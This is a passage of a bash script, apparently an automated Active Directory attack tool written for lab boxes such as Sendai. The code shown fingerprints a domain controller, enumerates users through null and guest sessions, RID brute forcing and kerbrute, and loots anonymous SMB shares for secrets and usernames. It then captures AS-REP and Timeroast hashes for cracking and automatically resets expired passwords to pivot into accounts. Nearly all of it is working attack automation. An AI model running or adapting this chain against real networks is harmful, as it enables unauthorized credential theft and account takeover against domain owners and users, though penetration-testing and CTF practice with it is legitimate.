    echo "$smb_info" | tee -a "$LOGFILE"

    local parsed_host parsed_dom
    parsed_host=$(echo "$smb_info" | grep -oP '\(name:\K[^)]+'   | head -1)
    parsed_dom=$( echo "$smb_info" | grep -oP '\(domain:\K[^)]+' | head -1)
    # When NTLM is disabled (e.g. Kerberos-only DCs) nxc echoes the IP back as
    # name/domain — treat that as "not detected" so the LDAP fallback kicks in.
    [[ "$parsed_host" == "$DC_IP" ]] && parsed_host=""
    [[ "$parsed_dom"  == "$DC_IP" ]] && parsed_dom=""

    [[ -n "$parsed_host" ]] && { DC_HOST="$parsed_host"; ok "DC hostname: ${C_BOLD}$DC_HOST${C_RESET}"; }
    if [[ -n "$parsed_dom" ]]; then
        if [[ -z "$DOMAIN" ]]; then
            DOMAIN="$parsed_dom"; ok "Domain detected: ${C_BOLD}$DOMAIN${C_RESET}"
        elif [[ "${DOMAIN,,}" != "${parsed_dom,,}" ]]; then
            # The DC's advertised domain IS the authoritative Kerberos realm. A mismatch
            # means the -d / guessed value is wrong (e.g. sendai.htb vs the real
            # sendai.vl) → KDC_ERR_WRONG_REALM on every getTGT, so the whole pivot dies
            # before must-change resets can fire. Trust the DC over what we were told,
            # and rebuild the FQDN/realm from it.
            warn "Supplied domain '${DOMAIN}' ≠ DC-advertised '${parsed_dom}' → using the DC's realm (authoritative)"
            DOMAIN="$parsed_dom"; DC_FQDN=""
        fi
    fi

    # Fallback: resolve domain/FQDN via LDAP rootDSE, then LDAPS certificate.
    # Works on Kerberos-only DCs where SMB fingerprinting yields nothing.
    if [[ -z "$DOMAIN" || -z "$DC_HOST" ]]; then
        subsection "Resolving domain/FQDN via LDAP rootDSE (NTLM-independent)"
        local root dnsh nctx
        root=$(ldapsearch -x -H "ldap://$DC_IP" -s base -b "" dnsHostName defaultNamingContext 2>/dev/null)
        dnsh=$(echo "$root" | grep -oiP 'dnsHostName:\s*\K\S+' | head -1)
        nctx=$(echo "$root" | grep -oiP 'defaultNamingContext:\s*\K\S+' | head -1)
        # LDAPS certificate CN as a secondary source
        if [[ -z "$dnsh" ]]; then
            dnsh=$(timeout 8 openssl s_client -connect "$DC_IP:636" 2>/dev/null </dev/null \
                   | openssl x509 -noout -subject 2>/dev/null | grep -oiP 'CN\s*=\s*\K[^,/]+' | head -1)
        fi
        if [[ -n "$dnsh" && "$dnsh" == *.* ]]; then
            DC_FQDN="$dnsh"; DC_HOST="${dnsh%%.*}"; DOMAIN="${dnsh#*.}"
            ok "Resolved via LDAP: host=${C_BOLD}$DC_HOST${C_RESET} domain=${C_BOLD}$DOMAIN${C_RESET}"
        elif [[ -n "$nctx" ]]; then
            # DC=corp,DC=local -> corp.local
            DOMAIN=$(echo "$nctx" | sed -E 's/[Dd][Cc]=//g; s/,/./g')
            ok "Domain from naming context: ${C_BOLD}$DOMAIN${C_RESET}"
        fi
    fi

    if [[ -n "$DC_HOST" && -n "$DOMAIN" && -z "$DC_FQDN" ]]; then DC_FQDN="${DC_HOST}.${DOMAIN}"; fi
    [[ -n "$DC_FQDN" ]] && ok "DC FQDN: ${C_BOLD}$DC_FQDN${C_RESET}"

    # Decide the target used for authenticated calls
    if [[ "$KERBEROS" == "1" && -n "$DC_FQDN" ]]; then
        DCT="$DC_FQDN"; ok "Authentication mode: ${C_BOLD}Kerberos${C_RESET} (target $DCT)"
    else
        DCT="$DC_IP"
        [[ "$KERBEROS" == "1" ]] && warn "Kerberos requested but FQDN unknown → falling back to NTLM (target $DCT)" && KERBEROS=0
    fi
    [[ -z "$DOMAIN" ]] && warn "Domain could not be auto-detected — supply it with -d <domain>"
}

# ===========================================================================
#  PHASE 1 — /etc/hosts + CLOCK SYNC (Kerberos prerequisite)
# ===========================================================================
phase_hosts_time() {
    section "PHASE 1 · /etc/hosts + CLOCK SYNC (Kerberos prerequisite)"

    if [[ "$SUDO_OK" == "1" && -n "$DOMAIN" ]]; then
        subsection "Updating /etc/hosts"
        local entry="$DC_IP $DC_FQDN $DOMAIN $DC_HOST"
        local fq_re="${DC_FQDN//./\\.}" dom_re="${DOMAIN//./\\.}"
        # Always purge EVERY stale line referencing this FQDN/domain (any IP) AND
        # this IP — otherwise a leftover line from a previous box revert resolves
        # first and the whole chain hits a dead host. We rewrite, never append.
        # NB: we use `bash -c "… >> file"` (not a piped `tee`) because _sudo feeds
        # the sudo password on stdin, which would clobber a pipe.
        _sudo sed -i -E "/(^|[[:space:]])(${fq_re}|${dom_re})([[:space:]]|\$)/d; /^${DC_IP}[[:space:]]/d" /etc/hosts 2>/dev/null
        if _sudo bash -c "printf '%s\n' '$entry' >> /etc/hosts"; then
            ok "Set /etc/hosts (stale entries purged): ${C_BOLD}$entry${C_RESET}"
            rb_record "Set /etc/hosts entry for $DOMAIN ($DC_IP)" \
                      "sudo sed -i -E '/(^|[[:space:]])${fq_re}([[:space:]]|\$)/d' /etc/hosts"
            if getent hosts "$DC_FQDN" 2>/dev/null | grep -q "^${DC_IP}[[:space:]]"; then
                ok "$DC_FQDN → $DC_IP ✓"
            else
                warn "$DC_FQDN still not resolving to $DC_IP (check /etc/hosts manually)"
            fi
        else
            err "Failed to write /etc/hosts"
        fi
    else
        warn "No sudo or no domain: skipping /etc/hosts (add manually: $DC_IP $DC_FQDN $DOMAIN)"
    fi

    # A correct krb5.conf for the TARGET realm. CRITICAL: tools that rely on the
    # system /etc/krb5.conf (evil-winrm, nxc winrm) silently fail Kerberos when it's
    # left pointing at a PREVIOUS box's realm (e.g. default_realm = OTHERBOX.HTB).
    # We write a per-run config and point KRB5_CONFIG at it, so every Kerberos tool
    # uses the right realm/KDC — no sudo, no touching the system file.
    if [[ -n "$DOMAIN" && -n "$DC_FQDN" ]]; then
        subsection "Writing a target-correct krb5.conf"
        local realm="${DOMAIN^^}" kc="$OUTDIR/krb5.conf"
        cat >"$kc" <<KRB5CONF
[libdefaults]
    default_realm = $realm
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false
    udp_preference_limit = 1
[realms]
    $realm = {
        kdc = $DC_FQDN
        admin_server = $DC_FQDN
        default_domain = $DOMAIN
    }
[domain_realm]
    .$DOMAIN = $realm
    $DOMAIN = $realm
KRB5CONF
        export KRB5_CONFIG="$kc"
        ok "krb5.conf → realm ${C_BOLD}$realm${C_RESET} (KRB5_CONFIG set → fixes evil-winrm / nxc Kerberos)"
    fi

    subsection "Synchronizing clock with the DC (critical for Kerberos)"
    if [[ "$SUDO_OK" == "1" ]]; then
        run "sudo ntpdate $DC_IP"
        if _sudo ntpdate "$DC_IP" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'adjust|step|offset'; then
            ok "Clock synced with the DC"
        else
            warn "ntpdate failed, retrying with -u…"
            _sudo ntpdate -u "$DC_IP" 2>&1 | tee -a "$LOGFILE" \
                && ok "Synced (-u mode)" \
                || warn "Could not sync; if Kerberos throws KRB_AP_ERR_SKEW, sync manually"
        fi
    else
        warn "No sudo: cannot sync time. On clock skew run: sudo ntpdate $DC_IP"
    fi
}

# ===========================================================================
#  PHASE 2 — UNAUTHENTICATED ENUMERATION  (null / guest / anonymous)
# ===========================================================================
phase_unauth() {
    # If the operator already supplied credentials, null/guest/anonymous enumeration
    # is redundant — authenticated SMB/LDAP enum covers all of it (and better). Skip
    # the whole unauth phase so we don't waste time / make noise re-deriving it.
    if [[ -n "$USER" && ( -n "$PASS" || -n "$HASH" ) ]]; then
        info "Credentials supplied → skipping unauthenticated null/guest/anonymous enum (redundant)"
        return
    fi
    section "PHASE 2 · UNAUTHENTICATED ENUMERATION (null / guest / anonymous)"

    subsection "SMB: null session & guest"
    run "$NXC smb $DC_IP -u '' -p ''";    $NXC smb "$DC_IP" -u '' -p '' 2>&1 | tee -a "$LOGFILE"
    run "$NXC smb $DC_IP -u guest -p ''"; local _gt; _gt=$($NXC smb "$DC_IP" -u 'guest' -p '' 2>&1); echo "$_gt" | tee -a "$LOGFILE"
    # If guest is enabled, prefer it as the anonymous credential everywhere below — it
    # out-enumerates the null session on hardened DCs (the Sendai case).
    if grep -qiE '\[\+\][^[]*\\guest:' <<<"$_gt"; then
        GUEST_ENABLED=1
        loot "Guest account is ENABLED → trying guest alongside null for anonymous enumeration"
    fi

    subsection "SMB: anonymously accessible shares"
    run "$NXC smb $DC_IP -u '' -p '' --shares"
    local sh; sh=$($NXC smb "$DC_IP" -u '' -p '' --shares 2>&1); echo "$sh" | tee -a "$LOGFILE"
    # Null denied but guest available → retry as guest (and remember guest as ANON_U
    # so the share download below uses the session that actually works).
    if ! grep -qiE 'READ|WRITE' <<<"$sh" && [[ "$GUEST_ENABLED" == "1" ]]; then
        run "$NXC smb $DC_IP -u guest -p '' --shares   (null denied → guest)"
        local _shg; _shg=$($NXC smb "$DC_IP" -u guest -p '' --shares 2>&1); echo "$_shg" | tee -a "$LOGFILE"
        if grep -qiE 'READ|WRITE' <<<"$_shg"; then sh="$_shg"; ANON_U="guest"; ANON_P=""
            loot "Shares enumerated via GUEST session (null session was denied)"; fi
    fi
    if echo "$sh" | grep -qiE 'READ|WRITE'; then
        loot "Shares reachable without credentials! saved to loot"
        echo "$sh" >"$OUTDIR/shares_anon.txt"
    fi
    have smbmap && { run "smbmap -H $DC_IP -u null -p null"; smbmap -H "$DC_IP" -u null -p null 2>&1 | tee -a "$LOGFILE"; }

    # USER ENUMERATION FIRST — it's cheap and, via a guest session, usually returns the
    # full domain user list outright. Doing this BEFORE the (slow) share download means
    # that when RID-brute succeeds we already hold every user and the share looting
    # below is just for the password HINT, not a desperate hunt for usernames.
    subsection "RID brute force (enumerate users without credentials)"
    # A plain NULL session (-u '' -p '') is commonly DENIED on hardened DCs (Sendai
    # returns LSAD STATUS_ACCESS_DENIED), but a GUEST session still allows SAMR RID
    # cycling — ANY junk username with a blank password is mapped to Guest when guest
    # access is enabled. Try null first, then guest/junk, and keep whichever returns
    # users. (This is the exact reason `nxc -u test -p '' --rid-brute` works on Sendai
    # while `-u ''` does not.)
    local rb="" _pair _ru _rp _ridok=""
    for _pair in "_NULL_ _NULL_" "guest _NULL_" "adautopwn _NULL_"; do
        _ru="${_pair%% *}"; _rp="${_pair##* }"
        [[ "$_ru" == "_NULL_" ]] && _ru=""; [[ "$_rp" == "_NULL_" ]] && _rp=""
        run "$NXC smb $DC_IP -u '${_ru}' -p '${_rp}' --rid-brute 4000"
        rb=$($NXC smb "$DC_IP" -u "$_ru" -p "$_rp" --rid-brute 4000 2>&1); echo "$rb" | tee -a "$LOGFILE"
        echo "$rb" | grep -i 'SidTypeUser' | grep -oP '\\\K[^ ]+' | sort -u >"$OUTDIR/users_ridbrute.txt"
        [[ -s "$OUTDIR/users_ridbrute.txt" ]] && { _ridok="$_ru"; break; }
    done
    if [[ -s "$OUTDIR/users_ridbrute.txt" ]]; then
        [[ -n "$_ridok" ]] && loot "RID brute worked via GUEST session (-u '${_ridok}' -p '') — null session was denied"
        loot "$(wc -l <"$OUTDIR/users_ridbrute.txt") users via RID brute → users_ridbrute.txt"
        while read -r u; do echo -e "      ${C_GREEN}·${C_RESET} $u"; FOUND_USERS+=("$u"); done <"$OUTDIR/users_ridbrute.txt"
    fi

    subsection "rpcclient: enumdomusers (null / guest session)"
    # Same null-vs-guest story: fall back to a guest session if the null one is denied.
    for _pair in "-U '' -N" "-U 'guest%'" "-U 'adautopwn%'"; do
        run "rpcclient $_pair $DC_IP -c enumdomusers"
        eval "rpcclient $_pair \"$DC_IP\" -c 'enumdomusers' 2>&1" | tee -a "$LOGFILE" \
            | grep -oP 'user:\[\K[^\]]+' | sort -u >"$OUTDIR/users_rpc.txt"
        [[ -s "$OUTDIR/users_rpc.txt" ]] && break
    done
    [[ -s "$OUTDIR/users_rpc.txt" ]] && loot "Users via rpcclient → users_rpc.txt"

    # DOWNLOAD + harvest anonymously-readable shares. Listing isn't enough — the
    # weak-password hint that gives the foothold lives INSIDE these files (e.g.
    # Sendai's incident.txt). nxc's null spider is tried first; if it pulls nothing
    # (or nxc --shares misses a share that smbclient/smbmap can see) we fall back to
    # smbclient recursive download per readable non-default share.
    subsection "Anonymous share looting — download readable files + harvest creds"
    local adl="$OUTDIR/shares_anon"; mkdir -p "$adl"
    # Use whichever anonymous session works (guest when enabled, else null) for both nxc
    # and smbclient — guest reaches shares a null session can't on hardened DCs.
    local -a _sca; [[ -n "$ANON_U" ]] && _sca=(-U "${ANON_U}%${ANON_P}") || _sca=(-N)
    $NXC smb "$DC_IP" -u "$ANON_U" -p "$ANON_P" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
        EXCLUDE_EXTS=ico,lnk,ini,db,dat,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,exe,dll,msi,sys,mui,cat EXCLUDE_FILTER=ipc$,Default,AppData,WinX,Cache,Crashpad,Packages,Temp,Roaming,desktop.ini,Microsoft \
        OUTPUT_FOLDER="$adl" 2>&1 | tail -15 | tee -a "$LOGFILE"
    if [[ -z "$(find "$adl" -type f ! -name '*.json' 2>/dev/null)" ]] && have smbclient; then
        info "nxc spider pulled nothing → falling back to smbclient recursive download"
        local _shl; _shl=$(printf '%s\n' "$sh" | grep -iE '[[:space:]]READ([[:space:]]|$)' \
            | sed -E 's/^[A-Z]+[[:space:]]+\S+[[:space:]]+[0-9]+[[:space:]]+\S+[[:space:]]+//' | awk '{print $1}')
        [[ -z "$_shl" ]] && _shl=$(smbclient -L "//$DC_IP" "${_sca[@]}" 2>/dev/null | awk '/Disk/{print $1}')
        local _s
        while IFS= read -r _s; do
            [[ -z "$_s" ]] && continue
            case "${_s^^}" in ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON|SHARE|-----|DISK) continue;; esac
            local _d="$adl/$_s"; mkdir -p "$_d"
            smbclient "//$DC_IP/$_s" "${_sca[@]}" -c "recurse ON; prompt OFF; lcd \"$_d\"; mget *" >/dev/null 2>&1
        done < <(printf '%s\n' "$_shl" | sort -u)
    fi
    local _af; _af=$(find "$adl" -type f ! -name '*.json' 2>/dev/null)
    if [[ -n "$_af" ]]; then
        loot "$(echo "$_af" | grep -c .) file(s) pulled from anonymous shares → shares_anon/"
        # Show small text files inline (the hint is usually a .txt note).
        while IFS= read -r _f; do
            [[ -z "$_f" ]] && continue
            detail "      ${C_BOLD}### ${_f#$adl/}${C_RESET}"
            sed 's/^/        /' "$_f" 2>/dev/null | head -25 | while IFS= read -r _l; do detail "$_l"; done
        done < <(find "$adl" -type f -size -20k \( -iname '*.txt' -o -iname '*.md' -o -iname '*.csv' -o -iname '*.ini' -o -iname '*.conf' -o -iname '*.cnf' -o -iname '*.xml' -o -iname '*.html' -o -iname '*.config' \) 2>/dev/null | head -12)
        harvest_secrets "anon-shares" < <(find "$adl" -type f -size -200k ! -name '*.json' ! -ipath '*/AppData/*' ! -ipath '*/Default/*' ! -iname 'desktop.ini' ! -iname '*.ini' -exec cat {} + 2>/dev/null)
        # Usernames live in these files too (the foothold account is NOT known in
        # advance -- it's whoever the spray flags). Mine candidate usernames from the
        # content (emails + first.last) so they get merged into users_all.txt and
        # sprayed, even if RID-brute missed them.
        { find "$adl" -type f -size -200k ! -name '*.json' ! -ipath '*/AppData/*' ! -ipath '*/Default/*' -exec cat {} + 2>/dev/null \
            | grep -ohiE '[a-z][a-z0-9._-]*@[a-z0-9.-]+\.[a-z]{2,}' | sed 's/@.*//'
          find "$adl" -type f -size -200k ! -name '*.json' ! -ipath '*/AppData/*' ! -ipath '*/Default/*' -exec cat {} + 2>/dev/null \
            | grep -ohiE '\b[a-z]{2,}\.[a-z]{2,}\b' \
            | grep -viE '\.(txt|csv|ini|xml|conf|cnf|html?|md|log|exe|dll|doc|docx|pdf|htb|com|local|net|org|lan|corp)$'
        } 2>/dev/null | tr 'A-Z' 'a-z' | sort -u >>"$OUTDIR/users_anon.txt"
        [[ -s "$OUTDIR/users_anon.txt" ]] && { sort -u -o "$OUTDIR/users_anon.txt" "$OUTDIR/users_anon.txt"
            loot "$(grep -c . "$OUTDIR/users_anon.txt") candidate username(s) mined from share content -> users_anon.txt"; }
    else
        info "No files in anonymously-readable shares"
    fi

    # Usernames also hide as DIRECTORY NAMES in shares — per-user folders such as
    # transfer/<user>/, home/<user>/, profiles\<user>. These dirs are frequently
    # EMPTY (so the file download above pulls nothing), yet the folder name IS the AD
    # username (first.last). FALLBACK ONLY: skip it when RID-brute / rpcclient already
    # enumerated the users (no point listing folders if we hold the real list) — it's
    # the recovery path for when even the guest RID/SAMR enum is denied.
    if [[ ! -s "$OUTDIR/users_ridbrute.txt" && ! -s "$OUTDIR/users_rpc.txt" ]] && have smbclient; then
        info "RID-brute/RPC gave no users → mining usernames from share folder names (fallback)"
        local _dshl _ds; local -a _sca2; [[ -n "$ANON_U" ]] && _sca2=(-U "${ANON_U}%${ANON_P}") || _sca2=(-N)
        _dshl=$(smbclient -L "//$DC_IP" "${_sca2[@]}" 2>/dev/null | awk '/Disk/{print $1}')
        while IFS= read -r _ds; do
            [[ -z "$_ds" ]] && continue
            case "${_ds^^}" in ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON) continue;; esac
            smbclient "//$DC_IP/$_ds" "${_sca2[@]}" -c "recurse ON; ls" 2>/dev/null \
                | grep -E '[[:space:]]D[[:space:]]' | awk '{print $1}'
        done < <(printf '%s\n' "$_dshl" | sort -u) \
            | grep -oiE '^[a-z][a-z0-9-]+\.[a-z][a-z0-9-]+$' \
            | grep -viE '^(temp|tmp|backup|public|default|all\.users|administrator)$' \
            | tr 'A-Z' 'a-z' | sort -u >>"$OUTDIR/users_anon.txt"
    fi
    if [[ -s "$OUTDIR/users_anon.txt" ]]; then
        sort -u -o "$OUTDIR/users_anon.txt" "$OUTDIR/users_anon.txt"
        loot "$(grep -c . "$OUTDIR/users_anon.txt") candidate username(s) mined from share content + folder names → users_anon.txt"
    fi

    subsection "LDAP: anonymous bind"
    if [[ -n "$DOMAIN" ]]; then
        local base="dc=${DOMAIN//./,dc=}"
        run "ldapsearch -x -H ldap://$DC_IP -b '$base' -s base"
        ldapsearch -x -H "ldap://$DC_IP" -b "$base" -s base 2>&1 | head -40 | tee -a "$LOGFILE"
    fi

    subsection "enum4linux-ng (full sweep)"
    if [[ "$STEALTH" == "1" ]]; then
        info "Stealth mode: skipping enum4linux-ng (noisy)"
    elif have enum4linux-ng; then
        run "enum4linux-ng -A $DC_IP"
        enum4linux-ng -A "$DC_IP" -oJ "$OUTDIR/enum4linux" 2>&1 | tail -60 | tee -a "$LOGFILE"
    fi

    subsection "kerbrute: user validation (userenum)"
    if [[ "$STEALTH" == "1" ]]; then
        info "Stealth mode: skipping kerbrute userenum (noisy)"
    elif [[ -x "$KERBRUTE_BIN" && -n "$DOMAIN" ]]; then
        cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
        local list="$OUTDIR/users_all.txt"
        if [[ ! -s "$list" ]]; then
            if [[ -n "$USER" ]]; then
                # We already hold credentials → authenticated enum will get the real
                # user list. Skip the slow/noisy mass brute against a huge wordlist.
                info "Credentials supplied → skipping mass userenum (authenticated enum covers it)"
                list=""
            else
                # No discovered users (RID-brute/RPC are denied on hardened DCs like
                # Server 2022): do NOT brute a 5000-username wordlist — it's noisy and
                # rarely productive. We rely on share-mined names + the empty/userpass
                # spray instead. Only userenum a list we actually have.
                info "No discovered users (RID-brute/RPC denied) — skipping the 5000-username userenum brute"
                list=""
            fi
        fi
        if [[ -n "$list" && -s "$list" ]]; then
            run "$KERBRUTE_BIN userenum -d $DOMAIN --dc $DC_IP $list"
            "$KERBRUTE_BIN" userenum -d "$DOMAIN" --dc "$DC_IP" "$list" 2>&1 | tee -a "$LOGFILE" \
                | grep -i 'VALID' | grep -oP '@\K[^@]+(?=@)' >"$OUTDIR/users_valid.txt"
            [[ -s "$OUTDIR/users_valid.txt" ]] && loot "Kerberos-confirmed valid users → users_valid.txt"
        fi
    fi

    cat "$OUTDIR"/users_*.txt 2>/dev/null | sort -u >"$OUTDIR/users_all.txt"
    [[ -s "$OUTDIR/users_all.txt" ]] && loot "Consolidated user list → users_all.txt ($(wc -l <"$OUTDIR/users_all.txt") unique)"
}

# ===========================================================================
#  PHASE 3 — AS-REP ROASTING (no credentials required)
# ===========================================================================
# Dynamic AS-REP roasting — strategy chosen from the live situation:
#   * authenticated  → ask LDAP for DONT_REQ_PREAUTH users (no wordlist needed)
#   * have user list → roast exactly those
#   * nothing at all → capped username-spray to seed identities
phase_asreproast() {
    section "AS-REP ROASTING"
    [[ -z "$DOMAIN" ]] && { warn "No domain, skipping"; return; }
    [[ "$CAP_KERBEROS" != "1" ]] && { warn "Kerberos (88) not exposed → AS-REP roasting not possible"; return; }
    have impacket-GetNPUsers || { warn "impacket-GetNPUsers unavailable, skipping"; return; }
    local outf="$OUTDIR/asrep_hashes.txt"

    if [[ "$HAVE_AUTH" == "1" ]]; then
        subsection "Authenticated roast (LDAP auto-selects preauth-less users)"
        if [[ -n "$KERB_TICKET" ]]; then
            run "impacket-GetNPUsers $(imp_principal) -k -no-pass -dc-host ${DC_FQDN:-$DC_IP} -request -format hashcat"
            KRB5CCNAME="$KERB_TICKET" impacket-GetNPUsers "$(imp_principal)" -k -no-pass -dc-host "${DC_FQDN:-$DC_IP}" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        elif [[ -n "$HASH" ]]; then
            run "impacket-GetNPUsers $(imp_principal) -hashes :$HASH -dc-ip $DC_IP -request -format hashcat"
            impacket-GetNPUsers "$(imp_principal)" -hashes ":$HASH" -dc-ip "$DC_IP" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        else
            run "impacket-GetNPUsers $(imp_principal):*** -dc-ip $DC_IP -request -format hashcat"
            impacket-GetNPUsers "$(imp_principal):${PASS}" -dc-ip "$DC_IP" -request -format hashcat 2>&1 \
                | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
        fi
    else
        # Unauthenticated: pick a user source dynamically
        local userfile=""
        if [[ -s "$OUTDIR/users_all.txt" ]]; then
            userfile="$OUTDIR/users_all.txt"
            subsection "Unauth roast against $(wc -l <"$userfile") discovered users"
        else
            info "No discovered users → skipping AS-REP roast (no 5000-username brute)"
            return
        fi
        [[ ! -s "$userfile" ]] && { warn "No usable user source for AS-REP"; return; }
        run "impacket-GetNPUsers $DOMAIN/ -no-pass -usersfile <list> -dc-ip $DC_IP -format hashcat"
        impacket-GetNPUsers "${DOMAIN}/" -no-pass -usersfile "$userfile" -dc-ip "$DC_IP" -format hashcat 2>&1 \
            | tee -a "$LOGFILE" | grep -E '^\$krb5asrep\$' >>"$outf"
    fi

    if [[ -s "$outf" ]]; then
        sort -u -o "$outf" "$outf"
        loot "AS-REP hashes captured!"
        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
        ok "Saved to asrep_hashes.txt (crack with: hashcat -m 18200)"
        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 18200 "AS-REP"
    else
        info "No AS-REP-roastable users found"
    fi
}

# ===========================================================================
#  TIME ROASTING  (MS-SNTP machine-account hashes, no domain creds required)
# ===========================================================================
phase_timeroast() {
    [[ "$STEALTH" == "1" ]] && { info "Stealth mode: skipping Timeroast"; return; }
    [[ -z "$DOMAIN" ]] && { warn "No domain, skipping Timeroast"; return; }

    section "TIME ROASTING · MS-SNTP machine-account hashes"
    local outf="$OUTDIR/timeroast_hashes.txt"; : >"$outf"

    # Opportunistic by design: recent NetExec builds include a timeroast module.
    # If the module is missing or the DC does not answer MS-SNTP requests, this
    # phase simply records no hashes and the engine keeps pivoting normally.
    if [[ -n "$NXC" ]] && nxc_has_module smb timeroast; then
        subsection "NetExec timeroast module"
        run "$NXC smb $DC_IP -u '' -p '' -M timeroast"
        $NXC smb "$DC_IP" -u '' -p '' -M timeroast 2>&1 | tee -a "$LOGFILE" \
            | grep -E '(\$sntp-ms\$|\$krb5pa\$|\$krb5tgs\$|\$krb5asrep\$)' >>"$outf"
    else
        info "NetExec timeroast module not available in this install → skipping"
    fi

    if [[ -s "$outf" ]]; then
        sort -u -o "$outf" "$outf"
        loot "Timeroast hashes captured → timeroast_hashes.txt"
        while read -r h; do echo -e "      ${C_MAGENTA}${h:0:80}…${C_RESET}"; done <"$outf"
        ok "Saved to timeroast_hashes.txt (hashcat mode 31300 for \$sntp-ms\$)"
        [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 31300 "Timeroast"
    else
        info "No Timeroast hashes captured (module unavailable, patched target, or no MS-SNTP response)"
        rm -f "$outf"
    fi
}

# Expired / must-change password: with the known (old) plaintext we can set a
# new one over kpasswd and use the account immediately — a real path, not a dead end.
_change_expired_password() {
    # An EMPTY old password is valid (anonymous must-change accounts left blank → the
    # empty string IS the current plaintext). Only bail when we hold a hash but no
    # plaintext (PtH context: kpasswd/changepasswd need plaintext, can't use the hash).
    [[ -z "$PASS" && -n "$HASH" ]] && return 1
    local tool; tool=$(command -v changepasswd.py || command -v impacket-changepasswd) || return 1
    local newpw="$PIVOT_PW" host="${DC_FQDN:-$DC_IP}"
    info "Must-change for '${USER}' (old: ${PASS:-<empty>}) → setting new password automatically: ${C_BOLD}${newpw}${C_RESET}"
    # The transport that works depends on the DC: kpasswd (Kerberos), rpc-samr
    # (SMB), or ldap. Force-pinning one (we used to pin kpasswd) fails on DCs where
    # that channel is closed — try them in order and stop at the first success.
    # changepasswd reads the CURRENT password via getpass, which reads from /dev/tty
    # when one exists — IGNORING a redirected stdin — so it drops to an interactive
    # "Current password:" prompt. Two things make it non-interactive:
    #   * run under `setsid` → new session, NO controlling tty → getpass can't open
    #     /dev/tty and falls back to stdin;
    #   * feed the old password on stdin via a here-string (empty = the real blank old
    #     password of a must-change account).
    # Protocol order matters: for a MUST-CHANGE account the SMB session itself returns
    # STATUS_PASSWORD_MUST_CHANGE, so rpc-samr/smb-samr can't even bind ("wrong
    # credentials"). kpasswd (the Kerberos change-password service) accepts the expired
    # password and is the one that works here — tried first.
    local proto out ok=0 runner=()
    command -v setsid >/dev/null 2>&1 && runner=(setsid)
    for proto in kpasswd ldap rpc-samr smb-samr; do
        run "$tool $DOMAIN/$USER:***@$host -newpass *** -p $proto -dc-ip $DC_IP"
        out=$("${runner[@]}" "$tool" "$DOMAIN/$USER:$PASS@$host" -newpass "$newpw" -p "$proto" -dc-ip "$DC_IP" 2>&1 <<<"$PASS")
        printf '%s\n' "$out" >>"$LOGFILE"
        if grep -qiE 'changed successfully|password was changed|success' <<<"$out"; then ok=1; break; fi
        grep -qiE 'unrecognized arguments|invalid choice' <<<"$out" && continue   # this impacket build lacks -p <proto>
    done
    if [[ "$ok" == "1" ]]; then
        loot "★ Changed expired password for '${USER}' (via $proto) → pivoting as that user"
        rb_record "Changed expired password for $USER (was expired; original unknown)" \
                  "echo 'Manual: coordinate password restore for $USER with the client'"
        add_secret "$newpw" "expired-password reset for $USER"
        note_cred_source "$USER" "expired-password reset ($proto)"
        unset "SEEN_CREDS[$(cred_key "$USER" "$PASS" "")]"
        queue_cred "$USER" "$newpw" ""
        return 0
    fi
    warn "Could not change the expired password for '${USER}' (tried kpasswd/rpc-samr/ldap) — last: ${out##*$'\n'}"; return 1
}

# Read the WHY behind a failed Kerberos auth and act on it. Returns 0 when the
# failure is explained (so we stop second-guessing it as a generic bad cred).
_classify_auth_error() {
    local out="$1"
    if echo "$out" | grep -qiE 'KEY_EXPIRED|PWD_EXPIRED|password.*expired|must.*change.*password'; then
        _change_expired_password; return 0
    elif echo "$out" | grep -qiE 'CLIENT_REVOKED|ACCOUNT.?DISABLED|account is disabled|revoked|LOCKED|account.*lock'; then
        warn "Account '${USER}' is DISABLED / LOCKED / REVOKED — creds may be valid once re-enabled/unlocked"
        note_cred_source "$USER" "valid-but-disabled/locked (enable to use)"
        echo "$USER" >>"$OUTDIR/disabled_or_locked.txt"; return 0
    elif echo "$out" | grep -qiE 'C_PRINCIPAL_UNKNOWN|PRINCIPAL_UNKNOWN|client not found|CLIENT_NOT_FOUND'; then
        warn "Account '${USER}' does NOT exist — it may be DELETED (check AD Recycle Bin / restore it)"; return 0
    elif echo "$out" | grep -qiE 'PREAUTH_FAILED|wrong password|LOGON_FAILURE|preauthentication'; then
        err "Wrong password for '${USER}'"; return 0
    elif echo "$out" | grep -qiE 'SKEW|clock'; then
        warn "Clock skew vs DC — sync time (sudo ntpdate $DC_IP) and retry '${USER}'"; return 0
    fi
    return 1
}

# ===========================================================================
#  PHASE 4 — CREDENTIAL VALIDATION + KERBEROS TGT
# ===========================================================================
phase_validate_creds() {
    [[ -z "$USER" ]] && return
    section "PHASE 4 · KERBEROS TGT + CREDENTIAL VALIDATION"

    # --- Step 1: request the TGT FIRST. getTGT talks to -dc-ip directly, so it
    # works even before DNS/hosts is sorted, and a successful TGT is definitive
    # proof the credentials are valid. ---
    if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]] \
       && { [[ -n "$PASS" ]] || [[ -n "$HASH" ]]; }; then
        # NOTE: skipped when the password is EMPTY (blank-password accounts) — getTGT
        # can't take an empty password on the CLI, it would drop to an interactive
        # "Password:" prompt (that confusing prompt you saw). We validate such accounts
        # over NTLM SMB below instead, where `-p ''` works and STATUS_PASSWORD_MUST_CHANGE
        # is detected → automatic reset.
        subsection "Requesting Kerberos TGT first (-dc-ip, DNS-independent)"
        local tgt="$OUTDIR/$(_safe_name "$USER").ccache" tgtout=""
        rm -f "${USER}.ccache"
        if [[ -n "$HASH" ]]; then
